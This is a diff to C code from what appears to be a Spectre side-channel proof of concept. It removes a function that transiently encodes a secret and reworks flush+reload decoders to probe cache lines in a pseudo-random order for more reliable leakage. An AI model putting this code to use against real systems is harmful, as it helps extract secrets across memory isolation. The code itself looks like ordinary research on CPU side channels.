@@ -1,28 +1,15 @@
 #include "../include/spectre.h"
 
-// returns true during the training phase, false if encoding can only happen transiently
-bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
-                                  uint8_t bits_count, uint64_t stride),
-               uint32_t iteration, uint32_t *train_data,
-               uint32_t train_data_len, uint64_t secret, uint8_t channel[],
-               uint8_t bits_count, uint64_t stride)
-{
-    if (train_data[iteration] < train_data_len)
-    {
-        asm_encode(secret, channel, bits_count, stride);
-        return true;
-    }
-    return false;
-}
-
 uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
 {
     uint64_t out = 0;
+    uint32_t rand_i;
     for (uint32_t i = 1; i < bits_count + 1; i++)
     {
-        if (is_cached_load((side_channel) + (i * stride), threshold))
+        rand_i = (((i) * 4079) + 13) % (bits_count);
+        if (is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
         {
-            out += DOUBLE_TIMES(1, (i - 1) % 8);
+            out += DOUBLE_TIMES(1, (rand_i) % 8);
         }
     }
     return out;
@@ -43,14 +30,15 @@ uint64_t decode_load_flush_bitwise(uint8_t side_channel[], uint8_t bits_count, u
 
 uint64_t decode_flush_reload_array_index(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
 {
+    uint32_t element_count = powl(2, bits_count);
     uint64_t out = 0;
-    // running backwards, because 0 is somehow always cached :|
-    // But thats fine ;)
-    for (uint32_t i = (size_t)powl(2, bits_count); 0 < i; i--)
+    uint32_t rand_i;
+    for (uint32_t i = 0; i < element_count; i++)
     {
-        if (is_cached_load((side_channel) + ((i) * stride), threshold))
+        rand_i = (((i) * 167) + 67) % element_count;
+        if (is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
         {
-            out = i-1;
+            out = rand_i;
             break;
         }
     }
